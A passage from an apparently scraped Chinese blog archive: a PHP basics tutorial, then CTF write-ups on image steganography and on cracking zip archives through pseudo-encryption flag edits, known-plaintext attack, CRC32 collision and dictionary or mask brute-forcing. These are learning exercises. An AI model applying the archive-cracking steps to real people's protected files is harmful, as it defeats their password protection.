中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是“任何有值的东西”。 += $a=1; $b=2; $a+=$b;//$a=$a+$b; echo $a; -= $a=2; $b=1; $a-=$b;//$a=$a-$b echo $a; 4.比较运算符概念：*对操作数（按照比较运算符的要求,规则）进行比较。如果比较出的结果满足比较运算符的要求那么结果就是true(真，成立，满足),否则就是false（假，不成立,不满足）*PHP中规定：使用echo输出布尔类型值的时候echo true;它在页面中会输出1echo false;它会在页面中什么都不输出所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了的结果！(1)== 值是否相等如果值相等则就是 true（真，成立）如果值不相等那么就是false（假，不成立） $a=1; $b=1; var_dump($a==$b);//true (2)=== 全等（值要相等，类型也要相等）如果两边操作数的值 全等那么就是true否则就是false $a=11; $b=&#39;11&#39;; //var_dump($a==$b);//true var_dump($a===$b);//false 3)!= 值是否不相等如果两边操作数的值不相等那么就是true，否则就是false $a=1; $b=11; var_dump($a!=$b);//true (4)&lt;&gt; 同上(5)!== 不全等如果两边的操作数不全等那么就是true，否则就是false /* $a=1111; $b=2; var_dump($a!=$b);//true var_dump($a!==$b);//true */ $a=11; $b=&#39;11&#39;; var_dump($a!=$b);//false var_dump($a!==$b);//true,$a不全等于$b (6)&lt; 小于比较两边操作数的值，前面的是否小与后面的 $a=1; $b=1; var_dump($a&lt;$b);//false,$a小与$b这句话正确还是错误 (7)&gt; 大于 $a=10; $b=1; var_dump($a&gt;$b); (8)&lt;= 小于等于 $a=1; $b=1; var_dump($a&lt;=$b);//$a小与等于$b就是true,否则就是false (9)&gt;= 大于等于 $a=2; $b=1; var_dump($a&gt;=$b);//true ​ 5.逻辑运算符概念：对表达式进行逻辑运算，运算出的结果是布尔类型的值（true,false）要求：参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！(1)逻辑与and 或者 &amp;&amp;运算规则：左右两边的表达式的值都为true的时候，运算的结果就是true 否则只要其中任意一个为false，运算的结果就是false;现实举例： true 及格 false 不及格 左右两边的表达式就是我们要考试的科目;要求：当语文和数学都及格的时候那么，最终的结果才能够通过(true),否则就是不通过(false) $a=false;//语文 $b=true;//数学 var_dump($a &amp;&amp; $b); *中间隐含一个问题：“短路”,运算符的优先级的问题！*我们的程序语言的设计者认为： 只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false那个这个整个运行的过程就不重要了！当然短路问题并不会遇到太多，就算遇到也不会有什么影响！ (2)逻辑或or 或者 ||运算规则：左右两边的表达式的值有一个为true，运算的结果就是true，只有当两边的值都是false的时候，结果才会是false 例： $a=false;//语文 $b=true;//数学 var_dump($a || $b); 现实举例：要求：当语文和数学有一门及格那么最终的结果就是通过true中间隐含一个问题：“短路”,运算符的优先级的问题！我们的程序语言的设计者认为： 只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false那个这个整个运行的过程就不重要了！当然短路问题并不会遇到太多，就算遇到也不会有什么影响！ (3)逻辑异或xor运算规则：左右两边的表达式的值不一样的时候结果就是true,如果一样那么运算的结果就是false 例： $a=false; $b=false; var_dump($a xor $b); (4)逻辑非!运算规则：将原来表达式的值否定掉，原来是true，那么结果就是false。原来是false，那么结果就是true6.位运算符7.其他运算符(1)? :三元运算格式： 表达式1 ? 表达式2 : 表达式3; 如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3 $a=false ? 10 : 20; echo $a;//20 (2)可以把系统的命令放在里面执行！ 涉及到跨平台: $a=`ipconfig`; $b=`ifconfig`; var_dump($b); (3)@屏蔽表达式可能发生错误！echo @$a;(4)=&gt;(5)-&gt;(6)instanceof8.运算符的优先级优先级的概念：*谁的优先级别高就先算谁结合方向：规定了从那个方向开始算的问题！*优先级归纳:(1)[无]递增递减(2)[右]逻辑非!(3)[左]乘，除，取余(4)[左]加，减，字符串连接符(5)[无]包含大于号或者小于号的比较运算符(6)[无]不包含大于号或者小于号的比较运算符(7)[左]逻辑与&amp;&amp;(8)[左]逻辑或||(9)[左]? :(10)[右]赋值运算符(12)[左 ]逻辑异或xor圆括号的作用：用圆括号可以将表达式里面的某一块看成一个整体！使用括号可以增强代码的可读性。 二、流程控制对PHP程序执行的过程进行控制！ 1、顺序执行自上而下的执行即可！ 对这个执行过程没有控制! 2、分支执行分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句（if，switch）来实现！1.if语句注意：我们if语句的表达式所控制的代码，最好用花括号括起来，哪怕就是一条语句也用花括号括起来！ if语句可以嵌套，这是根据实际需求来的！（1)单向条件if(表达式) 语句1;表达式的值为true 那么就执行语句1,否则就不执行！ 例： $pass=60; $a=40; if($a&gt;=$pass){ echo &#39;恭喜，考试通过&#39;; echo &#39;dwqdwqdq&#39;; //.......各种其他语句！ } echo &#39;代码执行结束！&#39;; (2)双向条件 例： $pass=60; $a=40; if($a&gt;=$pass){ echo &#39;恭喜你！考试通过啦！&#39;; //....... }else{ echo &#39;很遗憾，您的科目没有通过！&#39;; //....... } (3)多向条件 例： $a=84; $grade1=60;//低于60不及格 $grade2=75;//及格 $grade3=85;//良好 if($a&lt;$grade1){ echo &#39;不及格&#39;; }elseif($a&lt;$grade2){ echo &#39;童鞋你及格了&#39;; }elseif($a&lt;$grade3){ echo &#39;良好！&#39;; }else{ echo &#39;优秀&#39;; } 2.switch语句 switch(表达式){ case 值 1://case相当于== 语句块1; break; case 值 2: 语句块2; break; ....... default: 语句块n } 注意点： 1)表达式的值最好是整形或者字符串！ 2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break 3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下！ 4)case后面的语句块是不需要{}括起来的 3、循环执行计算机最擅长的功能之一就是按照规定的条件，重复执行某些操作，这是程序设计中最能发挥计算机特长的程序结构。1.while语句 while(表达式){ 各种语句.... } 当表达式的值为true,那么就执行下面的语句块， 当语句块执行结束之后，继续返回上面来判断表达式的值是true还是false，如果还是true，那么就继续执行语句块。直到这个表达式的值为false，那么这个while语句就执行结束了！ 例： $i=0; while($i&lt;10){ echo $i++.&#39;&lt;br /&gt;&#39;; } echo &#39;执行结束了！&#39;; 2.do…while语句 do{ 各种语句 }while(表达式); 与while语句区别就是，do while语句至少会执行一次！3.for语句 for(表达式a;表达式b;表达式c){ 各种语句 } 表达式a:会放一些初始化话的语句,$i=0,放多个表达式,中间用,隔开表达式b：会放一些用来判断true或者false的表达式！，也可以放多个表达式，中间用,隔开表达c：会放一些对初始化的变量进行自增的语句！放多个表达式,中间用,隔开 表达式a 表达式b 如果是true 语句块 表达式c 表达式b 4、特殊的流程控制语句1.break语句作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！ 后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！2.continue语句作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！3.exit()语句作用：结束当前整个程序的执行！和die()作用一样 三、函数1、自定义函数function 函数名([形式参数1,形式参数2,....形式参数n]){ //各种PHP代码.... //...... return 表达式;//也可以不返回，如果不写那么默认返回null } 函数的调用: 函数的调用需要遵循定义函数的时候写的规则，一一对应，将具体实参传给定义函数时候写的形参调用函数之后执行的过程是相对独立的，互补干扰，默认没有联系执行完毕返回调用的位置继续向下执行return 函数的返回值：返回给调用者,默认返回null 如： &lt;?php function test($a,$b){//形参 echo $a+$b; } test(2,4); ?&gt; 2、PHP变量的范围1.局部变量 function test(){ $a=1;//局部变量$a，仅在函数内部有效 } echo $a;//输出$a不存在 2.全局变量 $i=10;//全局变量（外部变量） define(&#39;MY_NAME&#39;,&#39;xiaoming&#39;); function test(){ echo MY_NAME; global $i;//声明$i全局变量,函数内部才可以使用$i echo $i; $a=1; } //include &#39;&#39;引入 test(); 3.静态变量 function test(){ static $a=10;//静态变量$a,初始化静态变量,仅在第一次调用的时候执行 echo ++$a;//当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然存在 } test(); echo &#39;&lt;br /&gt;&#39;; test(); echo &#39;&lt;br /&gt;&#39;; test(); echo &#39;&lt;br /&gt;&#39;; 3、参数的传递1.按值传递参数传递参数的时候默认使用对形参的操作，根本不是影响到实参(变量)的值，两者相当于没有联系!2.按引用传递参数 按引用传递参数，相当于形参和实参指的是同一个人，只是名字不一样，对于形参的操作会直接影响到实参（变量）;3.函数的默认参数可以给形参设置默认值，设置方法:直接赋值给形参加默认值的时候是重右往左加的，右边的必须有，才能够给左边的加 例: &lt;?php function test($a,$b=100){ echo $a+$b; } test(200); ?&gt; 4.可变长度参数列表PHP提供给我们的，可以直接使用 func_get_args();//返回全部参数 func_get_arg();//返回第()参数,从0开始计数 func_num_args();//返回所在自定义函数的个数 ​ 这三个函数可以使用在我们的自定义函数内部，能够返回给我们一些关于参数的信息! 4、可变函数（变量函数）直接把函数赋值给变量 例： function test(){ echo &quot;asdff&quot;; } $a=&#39;test&#39;; $a(); echo $a; ​ 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数 5、递归函数递归函数即在函数内部自己调用自己的函数。递归函数：(1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，那么函数在执行过程中默认之间时没有联系的（除了静态变量，按引用传，全局变量）。里面的变量默认都是局部变量，相互之间没有影响！(2)递归函数，在函数的内部需要有适时结束函数运行的条件！ 例： function test($a){ echo $a.&#39;&amp;nbsp;&#39;; if($a&gt;0){ test($a-1); } else{ echo &#39;-------&#39;; } echo $a.&#39;&amp;nbsp;&#39;; } test(5); 执行结果： 查看网页源代码： 6、内部（内置）函数PHP提供许多现成的函数或者结构，可以在实际开发中直接使用。还有一些函数需要开启特定地 PHP 扩展模块，否则在使用它们的时候就会得到一个致命的“未定义函数”错误。常用的内置函数或扩展的函数，有这样的需求，才会去找对应的函数。 四、数组数组： 1、数组类型复合数据类型 2、数组创建方法一：变量名称[索引值]=数据;变量名称[]=数据;//不写索引值默认是 索引数组，从0开始 例： //$student[索引值]=具体的值//索引数组 $student[0]=12; $student[1]=&#39;小明&#39;; $student[2]=true; $student[3]=32.8; //需要使用print_r()函数来输出数组的具体内容 print_r($student); //var_dump($student); //$student[索引值]=具体的值//关联数组 $student[&#39;age&#39;]=12; $student[&#39;name&#39;]=&#39;小明&#39;; $student[&#39;sex&#39;]=true; $student[&#39;grade&#39;]=32.8; //需要使用print_r()函数来输出数组的具体内容 print_r($student); //var_dump($student); 方法二：变量名称=array( 索引值=&gt;数据, ……….); 例： $student=array(12,&#39;小明&#39;,true,32.8); print_r($student); //var_dump($student); //还可以写成 $student=array( 0=&gt;12, 1=&gt;&#39;小明&#39;, 2=&gt; true, 3=&gt;32.8 ); print_r($student); //var_dump($student); 关联数组同上 数据里面还可放数组类型的数据，同一个数组中存储任何类型的数据多维数组：访问数值的方法变量名称[索引值][索引值]…. 例： //二维数组 $student=array( 0=&gt;array(15,&#39;小红&#39;,true,63.2), 1=&gt;array(16,&#39;小明&#39;,true,70.3), 2=&gt;array(17,&#39;小张&#39;,true,65.4) ); print_r($student); //var_dump($student); 3、数组的遍历遍历数组：每个都经历一遍(1）for循环 用的比较少，因为有缺陷 count(数组)返回数组里面数据的个数，还可以获取多维数组的个数 例： $student=array(12,&#39;小明&#39;,true,32.8); echo count($student); (2）foreach语句来实现遍历数组的目的 foreach(数组变量 as 变量1){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据 } 例： $student=array(12,&#39;小明&#39;,true,32.8); foreach($student as $value){ echo $value.&#39;&lt;br /&gt;&#39;; } foreach(数组变量 as 变量1=&gt;变量2){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据的索引值 变量1代表当前正在经历（访问）的数据 } 例： $student=array(12,&#39;小明&#39;,true,32.8); foreach($student as $key=&gt;$value){ echo $key.&#39;-&#39;.$value.&#39;&lt;br /&gt;&#39;; } 规则多维数组的遍历： $arr=array( 0=&gt;array(15,&#39;小红&#39;,true,63.2), 1=&gt;array(16,&#39;小明&#39;,true,70.3), 2=&gt;array(17,&#39;小张&#39;,true,65.4) ); foreach($arr as $brr){ foreach($brr as $val){ echo $val.&#39;&lt;br /&gt;&#39;; } } 不规则多维数组的遍历，可以用递归思想解决 4、预定义超全局数组变量已经定义过（存在）的变量(存放的数据的类型是数组)超全局：超级全局变量，作用域（有效区域） 传递数据（提交数据）给服务器端主要两种方式 1.get方式比如： ?参数名=参数值&amp;参数名=参数值...... http://localhost/php/index.php?参数名=参数值在服务器端（请求的php文件这边）可以通过$_GET来获取到$_GET索引值为参数名，索引值对应的数据就是参数值 &lt;?php var_dump($_GET); ?&gt; 缺点：不太安全 2.post方式比如表单 post发送过来的！可以通过$_POST来获取到! 5、处理数组的相关函数(1)array_count_values统计数组中所有值出现的次数 $array = array(1, &quot;hello&quot;, 1, &quot;world&quot;, &quot;hello&quot;); print_r(array_count_values($array));//函数返回数组类型的数据 //print_r($array);//原来的数组不会受到任何影响 (2)array_key_exists检查给定的键名或索引是否存在于数组中 $search_array = array(&#39;first&#39; =&gt; 1, &#39;second&#39; =&gt; 4); var_dump(array_key_exists(&#39;second&#39;,$search_array)); (3)array_search在数组中搜索给定的值，如果成功则返回相应的键名 $array = array(0 =&gt; &#39;blue&#39;, 1 =&gt; &#39;red&#39;, 2 =&gt; &#39;green&#39;, 3 =&gt; &#39;red&#39;,4=&gt;15); var_dump(array_search(&#39;15&#39;, $array,true)); (4)count计算数组中的单元数目或对象中的属性个数 $array = array(0 =&gt; &#39;blue&#39;, 1 =&gt; &#39;red&#39;, 2 =&gt; &#39;green&#39;, 3 =&gt; &#39;red&#39;,4=&gt;15); var_dump(count($array)); (5)in_array检查数组中是否存在某个值 $os = array(&quot;Mac&quot;, &quot;NT&quot;, &quot;Irix&quot;, &quot;Linux&quot;); var_dump(in_array(&#39;Mac&#39;, $os)); (6)list把数组中的值赋给一些变量 $arr=array(60,80,100); list($sunshengli,$xiaohong,$xiaoming)=array(60,80,100); echo $sunshengli; (7)asort对数组进行排序并保持索引关系 $students=array( &#39;xiaoming&#39;=&gt;60, &#39;lilei&#39;=&gt;80, &#39;lihua&#39;=&gt;100, &#39;zhangsan&#39;=&gt;90 ); asort($students); print_r($students); 直接对数组里面的数据进行排序，第二个参数SORT_REGULAR - 正常比较单元（不改变类型）SORT_NUMERIC - 单元被作为数字来比较SORT_STRING - 单元被作为字符串来比较SORT_LOCALE_STRING - 根据当前的区域（locale）设置来把单元当作字符串比较。(8)array_filter用回调函数过滤数组中的单元 function odd($var){ return($var % 2 == 1); } function even($var){ return($var % 2 == 0); } $array1 = array(&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2, &quot;c&quot;=&gt;3, &quot;d&quot;=&gt;4, &quot;e&quot;=&gt;5); $array2 = array(6, 7, 8, 9, 10, 11, 12); echo &quot;Odd :\\n&quot;; print_r(array_filter($array1, &quot;odd&quot;)); echo &quot;Even:\\n&quot;; print_r(array_filter($array2, &quot;even&quot;)); ​ 所有数组函数 五、字符串处理1、去除空格或其他字符函数trim $str=&#39; abc &#39;; var_dump($str); var_dump(trim($str));//去除左右两边空白 $str=&#39;abcabcdefac&#39;; var_dump($str); var_dump(trim($str,&#39;bac&#39;));//如果要去除多个字符可以连着写 //trim去除两边//ltrim去除左边//rtrim去除右边 2、大小写转换函数$str=&#39;test&#39;; var_dump($str); $str1=strtoupper($str); var_dump($str); $str=&#39;TeSt&#39;; var_dump($str); var_dump(strtolower($str)); var_dump($str); 3、字符串查找函数1.substr_count统计某字符串出现的次数 $str=&#39;testteste&#39;; var_dump(substr_count($str,&#39;te&#39;));//统计某字符串出现的次数，不会计算重叠字符串,如：abcabcabc -&gt;1 $str=&#39;testteste&#39;; var_dump(substr_count($str,&#39;te&#39;,1,8));//不能超出字符串,从第二个到第九个查找 2.strpos查找某字符串首次出现的位置 $str=&#39;testteste&#39;; var_dump(strpos($str, &#39;t1&#39;)); if(strpos($str, &#39;t&#39;)===false){ echo &#39;没找到！&#39;; }else{ echo &#39;找到啦!&#39;; } $str=&#39;testteste&#39;; var_dump(strpos($str, &#39;t&#39;,1));//从第二个开始查找 3.strstr查找从某字符出现的位置到结尾的字符串 $str=&#39;testteste&#39;; var_dump($str); var_dump(strstr($str,&#39;s&#39;)); var_dump(strstr($str,&#39;s&#39;,true));//查找从某字符出现的位置到开始的字符串 4、字符串替换函数str_replace $str=&#39;testestab&#39;; var_dump($str); var_dump(str_replace(&#39;t&#39;,&#39;T&#39;,$str)); $str=array( &#39;abc123abc&#39;, &#39;123abcabc&#39;, &#39;abcab123c&#39; ); var_dump($str); $str1=str_replace(array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;),array(&#39;一&#39;,&#39;二&#39;,&#39;三&#39;),$str,$count); echo $count;//替换发生的次数 var_dump($str1); 5、与html标签相关的函数1.htmlspecialchars把预定义字符转换成html实体 $str=&lt;&lt;&lt;START &lt;p style=&quot;color:red;font-size:128px;&quot;&gt;我去问让他&lt;/p&gt;&quot; START; echo $str; echo &quot;\\n&quot;; echo htmlspecialchars($str);//把预定义字符转换成html实体 2.strip_tags从字符串中去除HTML和PHP标记 $str=&lt;&lt;&lt;START &lt;p style=&quot;color:red;font-size:128px;&quot;&gt;单位确定为取得完全&lt;/p&gt; &lt;div style=&quot;color:red;&quot;&gt;我的名字&lt;/div&gt; START; //echo $str; //echo &quot;\\n&quot;; echo strip_tags($str,&quot;&lt;div&gt;&lt;p&gt;&quot;); 6、字符串截取函数substr $str=&#39;qwzftest&#39;; echo substr($str,3,2);//从第四个开始截，截两个//不填2默认截到结尾 $str=&#39;test&#39;; echo substr($str,-3,2);//-3是从结尾开始数到倒数第三个 7、字符串分隔函数1.explode $str=&#39;test,test1,test2,test3&#39;; var_dump(explode(&#39;,&#39;,$str,2));//默认有几个“，”分隔几段。2表示分隔两段 2.str_split $str=&#39;test&#39;; var_dump(str_split($str,3));//默认每段一个字符，3表示每段3个字符","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"PHP","slug":"编程开发/PHP","permalink":"https://qwzf.github.io/categories/编程开发/PHP/"}],"tags":[{"name":"函数","slug":"函数","permalink":"https://qwzf.github.io/tags/函数/"},{"name":"基本语法","slug":"基本语法","permalink":"https://qwzf.github.io/tags/基本语法/"},{"name":"流程控制","slug":"流程控制","permalink":"https://qwzf.github.io/tags/流程控制/"},{"name":"数组","slug":"数组","permalink":"https://qwzf.github.io/tags/数组/"},{"name":"字符串","slug":"字符串","permalink":"https://qwzf.github.io/tags/字符串/"}],"author":"qwzf"},{"title":"MISC-隐写的总结","slug":"MISC-隐写的总结","date":"2019-04-06T10:33:32.078Z","updated":"2020-01-11T16:37:47.970Z","comments":true,"path":"2019/04/06/MISC-隐写的总结/","link":"","permalink":"https://qwzf.github.io/2019/04/06/MISC-隐写的总结/","excerpt":"","text":"这周做了几个隐写题，感觉非常有趣。看了许多大佬的博客，最终才完整的做完这些隐写题。为了加深自己的理解，还是有必要总结一下的。毕竟学以致用，学以会用！！ 解隐写题的一般思路: 首先看看图片是不是图种 然后使用binwalker分析图片,如果是有文件合成,分离 有时信息藏在备注中 工具stegsolve 编程分析 1、LSB隐写简介：LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。 用法：通常来说LSB加密用在无损压缩的数据格式文件中，例如图像中的png格式、bmp格式和音频的wav格式。由于这三种格式未对源数据进行有损压缩，因此可以将信息隐藏起来。 对于图像文件LSB的特征很明显，通常将信息隐藏在某一个颜色通道中。我们可以查看图片的每个像素点的RGB值，或者使用stegsolve工具进行查看。 stegsolve工具下载 需要下载Java配置Java环境或者只下载Java，用Java打开stegsolve.jar文件 由于图像是由像素构成的，每个像素有8位(对于BMP图像来说),通常最后一位的变化，通过肉眼是无法察觉的 例1： 下载题目文件并解压后，发现一个名叫taqing.png的图片。因为题目是“LSB”，所以这张图片应该进行了LSB隐写。 用stegsolve打开taqing.png,并选择Analyse的Data Extract 把Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ flag是flag{have a good time!} 例2： 下载题目文件并解压后，发现一个名叫LSBencode.png的图片。因为题目是“LSB2”，所以这张图片也应该进行了LSB隐写。 用stegsolve打开LSBencode.png,并选择Analyse的Data Extract 把Red、Green、Blue的最低有效位0那一列打对勾（原因），并点击Preview，在最上面会发现flag了！！ 2、盲水印由题目可知，此题为盲水印，所以使用bwm脚本（python2）另一个脚本decode脚本。 bwm脚本 decode脚本 并且这两个不完全一样，用其中一个加上水印，用另一个解不开，所以还是都存起来吧。 运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python 接下来： 如果是bwm脚本运行 python bwm.py decode 1.png 2.png flag.png 其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。 如果是decode脚本运行 python decode.py --original 1.png --image 2.png --result flag.png。 其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。 另外推荐一个加盲水印和分离盲水印的神器：WaterMarkH下载 例： 下载题目文件并解压后，发现两张图片：text.jpg和text2.jpg。因为题目是“盲水印”，所以这道题应该是找盲水印。 把文件后缀改成.png格式，结果我试了两个脚本都没有找到盲水印，我以为是因为python版本的问题，然而并不是。。。所以这道题应该是使用WaterMarkH加的盲水印，所以直接使用这个工具就找到了盲水印 3、双图例： 下载题目文件，解压出来就是双图first.png和second.png，先用stegslove打开first.png保存反色图片为1.bmp 然后打开保存的反色图片1.bmp，选择stegslove的image combiner结合second.png，保存结合的图片为solved.bmp 然后打开保存的结合图片solved.bmp，再用stegslove对二维码变化一下，得到三张二维码 扫描结果是DES 6XaMMbM7 和一长串字符，很显然是des加密，秘钥是6XaMMbM7，然后对长串字符进行DES解密，即可得到flag！！ 4、画图例： 根据题目可知，此题是画图 用winhex打开发现图片后面有很多的数据 复制下来保存为1.txt文件用notepad++转换一下编码 这就是坐标了,这样来画图吧 转换成gnuplot能识别的格式 保存1.txt文件，下载gnuplot画图工具，把1.txt文件和画图工具放入同一路径，打开gnuplot.exe,输入命令plot &quot;1.txt&quot;进行画图 扫描二维码，即可得到flag！！ 隐写题总结之后，果然让我对此更加理解了，开心！！！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"隐写","slug":"隐写","permalink":"https://qwzf.github.io/tags/隐写/"}],"author":"qwzf"},{"title":"MISC-zip压缩包的总结","slug":"MISC-zip压缩包的总结","date":"2019-04-05T16:21:56.744Z","updated":"2020-01-11T16:38:08.629Z","comments":true,"path":"2019/04/06/MISC-zip压缩包的总结/","link":"","permalink":"https://qwzf.github.io/2019/04/06/MISC-zip压缩包的总结/","excerpt":"","text":"做了那么多的MISC压缩包的CTF题，是时候总结一下经验了。手撕压缩包走起！ 1、伪加密zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。 重点部分把504B0304后的第3、4个byte改成0000还有把504B0102后的第5、6个byte改成0000即可破解伪加密。 识别真假加密无加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为00 00假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00真加密压缩源文件数据区的全局加密应当为09 00 例： 根据题目，这可能是一道伪加密题。把压缩包文件用winrar打开，看出来b.png进行了伪加密 把Blog的zip压缩包放进winhex,在最上面没发现伪加密标志位，所以我在最下面发现 把b.png的504B0102后第五位09改成00，即可破解伪加密，解压即可在b.png中得到flag！！ 2、明文攻击明文攻击是一种较为高效的攻击手段，大致原理是当不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。 推荐一个工具:APCHPR (可进行爆破/明文/字典/掩码攻击) 例: 根据题目看出来这道题可能是明文攻击，下载之后得到zip压缩包，用winrar打开 在zip文件里有个未加密的 提示.txt文件，在blingbling.zip有个加密的 提示.txt文件。所以这应该是明文攻击。把未加密的 提示.txt文件压缩成zip压缩包 当作明文。对blingbling.zip进行明文攻击，如下: 得到空白文档???的口令密码: 打开空白文档???，发现真的是空白的，想吐血。不过查了查百度发现，打开word文件，选择“选项”，然后选择“显示” 在隐藏文字和打印隐藏文件前打对勾，然后确定，然后打开空白文档???，就能看到flag了！！ 3、crc32碰撞CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。**** 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容 例: 根据题目可知，这道题可能是crc32碰撞。下载该压缩包，用winrar打开 会发现4个加密的txt文件，有三个大小为6的，一个存放flag大小为102的。crc32碰撞，碰撞文件的大小一般不大于6，大于6的一般碰撞不出来。且位于同一压缩包的文件，文件密码相同。所以对1.txt 2.txt 3.txt进行crc32碰撞 还有一款很好用的6位的CRC32爆破 附上神器：https://github.com/theonlypwner/crc32具体使用方法： python crc32.py reverse 你的crc32密文 密文记得加上0x变成16进制，三个txt文件碰撞结果如下 1.txt 2.txt 3.txt 在碰撞的内容中，找有意义的字符。1.txt中”you_ar“ 2.txt中“e_the_“ 3.txt中未发现有意义的字符。做到这一步，再次想吐血。还好我用notepad++打开碰撞脚本，发现一组特殊之处 想着是不是因为脚本里缺少特殊字符，而3.txt里有特殊字符。所以碰撞不出3.txt的内容。加上特殊字符后，碰撞结果如下 找到3.txt中的有意义的字符了，好开心！！！3.txt中的有意义字符“best!!”，结合1.txt的“you_ar“ 2.txt的”e_the_“得到flag.txt的密码：“you_are_the_best!!“，输入密码打开后发现 很明显是Base64加密的，所以Base64解密，得到 看起来解密结果符合url编码，所以url解码，得到最终flag如下： 4、爆破/字典/掩码攻击把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同 爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码 字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上 掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少 例： 用winrar打开发现一个加密文件 所以应该要暴力破解，把下载的压缩包放进ARCHPR(爆破工具)里，选择字典攻击(字典攻击比暴力攻击用时少)， 得出文件密码口令 输入密码，解压文件，得到一个文件夹。然后文件夹里有好几个文件夹，所以开启找可疑之处的历程 最终，我发现有个地方比较可疑 看着比较像Base16加密，所以进行Base16解密，得到flag 5、杂类例1: 很明显，这个题并没有给出有效提示(只给了提交格式)。下载后，用winrar打开发现一个zip.txt文件，打开后 根据504B0304可以看出这应该是一个压缩包的16进制编码，然后查询一下压缩包16进制编码格式，把不符合16进制编码的改成对应的16进制编码。改完后，把16进制编码粘贴在winhex里进行对压缩包的恢复 注意选择16进制粘贴格式 然后保存，用winrar打开恢复后的压缩包，结果发现一个flag.txt文件竟然是加密的，再次想吐血! 也没给什么提示，想着是不是伪加密，所以我用winhex打开恢复后的压缩包，发现果然是伪加密 把01改成00后保存，再次用winrar打开，发现flag.txt变成了未加密，开心！找到flag了！！ 例2: 这个题给了提示，一个公式f(x)=(x-n)%26+97，看着有点像凯撒公式。下载后，用winrar打开压缩包，进入“皮”文件夹发现两个txt文件 打开两个txt文件 key.txt应该就是凯撒加密的密文了，而提示.txt可能是密钥。然后，我开始理解题目提示的凯撒公式f(x)=(x-n)%26+97，我理解这是个加密公式，f(x)是密钥，x是明文，n是密文。然后我写出对应的解密公式str=((c1-97)+(key-97))%26+97，str是明文，c1是密文，key是密钥。由于写这篇blog时，我还不会写python脚本，于是我写了个c语言的 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { int j; char key[20]; char c1[20]=&quot;yrsimmpzrbkcokd&quot;,c2[20]=&quot;zokkhuapoloaeku&quot;,c3[20]=&quot;xloobshxdbamnqn&quot;,str1[20],str2[20],str3[20]; for(j=1;;j++) { printf(&quot;请输入密钥:&quot;);scanf(&quot;%s&quot;,key); printf(&quot;密文1:%s\\n密文2:%s\\n密文3:%s\\n&quot;,c1,c2,c3); //printf(&quot;密文1:%s&quot;,c1);//scanf(&quot;%s&quot;,c1); //printf(&quot;密文2:%s&quot;,c2);//scanf(&quot;%s&quot;,c2); // printf(&quot;密文3:%s&quot;,c3);//scanf(&quot;%s&quot;,c3); printf(&quot;明文1:&quot;); for(int i=0;i&lt;strlen(key);i++) { str1[i]=(c1[i]-97+key[i]-97)%26+97; printf(&quot;%c&quot;,str1[i]); } printf(&quot;\\n&quot;); printf(&quot;明文2:&quot;); for(int i=0;i&lt;strlen(key);i++) { str2[i]=(c2[i]-97+key[i]-97)%26+97; printf(&quot;%c&quot;,str2[i]); } printf(&quot;\\n&quot;); printf(&quot;明文3:&quot;); for(int i=0;i&lt;strlen(key);i++) { str3[i]=(c3[i]-97+key[i]-97)%26+97; printf(&quot;%c&quot;,str3[i]); } printf(&quot;\\n\\n&quot;); printf(&quot;a b c d e f g h i j k l m n o p q r s t u v w x y z&quot;); printf(&quot;\\n&quot;); printf(&quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26&quot;); printf(&quot;\\n&quot;); printf(&quot;26 25 24 